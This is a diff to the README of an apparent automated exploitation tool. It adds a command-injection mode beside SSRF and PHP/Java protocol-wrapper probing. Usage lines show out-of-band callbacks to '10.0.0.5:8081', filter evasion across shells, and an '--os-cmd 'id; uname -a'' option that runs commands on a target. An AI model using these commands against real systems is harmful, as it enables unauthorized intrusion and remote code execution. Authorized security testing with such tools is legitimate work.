@@ -9,9 +9,10 @@ not ask "is this parameter vulnerable" and stop there; it probes, reads the
 evidence, decides what to try next, adapts when a filter refuses, and keeps
 going until it has an exploit or has proven the path closed.
 
-The first classes it covers are SSRF and PHP protocol wrappers (`php://`,
-`gopher://`, `dict://`, `data://`, `phar://`). Further classes, including
-deserialization, are built on the same engine.
+The classes it covers are SSRF, PHP and Java protocol wrappers (`php://`,
+`gopher://`, `dict://`, `data://`, `phar://`, `jar:`, `jrt:`) and command
+injection. Further classes, including deserialization, are built on the same
+engine.
 
 ## Start here
 
@@ -20,6 +21,12 @@ what the target will accept, and reports what it proved:
 
     python injectorkit.py ssrf -u "http://target/api/fetch?url=http://example.com"
     python injectorkit.py proto -u "http://target/?file=index.php"
+    python injectorkit.py cmdi -u "http://target/ping?host=127.0.0.1"
+
+A body is a form post unless you say otherwise, so a parameter behind a form
+takes `--data` rather than a query string:
+
+    python injectorkit.py proto -u "http://target/" --data "file=index.php" --param file
 
 When the page has a form rather than a query string, let it read the form:
 
@@ -98,11 +105,35 @@ because a request that names its own identity is more specific than a default.
     python injectorkit.py ssrf -u "http://target/api/fetch?url=x" --param url --oob 10.0.0.5:8081
     python injectorkit.py proto -u "http://target/?file=index.php"
     python injectorkit.py proto -r burp.txt --param file --oob 10.0.0.5:8081
+    python injectorkit.py cmdi -u "http://target/ping?host=127.0.0.1"
 
-Two classes so far. `ssrf` asks what a URL parameter can reach; `proto` asks what
-a path parameter will accept and hand back - `php://filter` source disclosure,
-`data://` execution, `phar://`, `zip://`, `jar:`, `jrt:`, `netdoc://`, and the
-JNDI schemes.
+Three classes so far. `ssrf` asks what a URL parameter can reach; `proto` asks
+what a path parameter will accept and hand back - `php://filter` source
+disclosure, `data://` execution, `phar://`, `zip://`, `jar:`, `jrt:`,
+`netdoc://`, and the JNDI schemes; `cmdi` asks which shell a parameter reaches
+and what it will run there.
+
+### Command injection
+
+The question is arithmetic: the tool asks the target to print two fresh markers
+with a computed number between them. A page that reflects the input returns the
+expression; only a shell that ran it returns the number. The payload never
+contains the answer, so a page echoing it cannot pass.
+
+Because that question does not depend on the shell, the shell is something to
+search rather than assume. `sh`, `bash`, PowerShell and the Windows command
+interpreter are modelled as languages that can print a literal and print a sum,
+crossed with the ways a command can be started - the value is the whole command,
+or it is an argument to a command the page already runs and has to be ended
+first. Getting past a filter is not the answer here, so the search keeps climbing
+until something actually runs.
+
+When it does, `--os-cmd` runs one command through the shape that was proved to
+work, and reports honestly if the injection stopped working between proving it
+and using it:
+
+    python injectorkit.py cmdi -u "http://target/ping?host=127.0.0.1" \
+        --exploit --os-cmd 'id; uname -a'
 
 ### Getting a shell
 
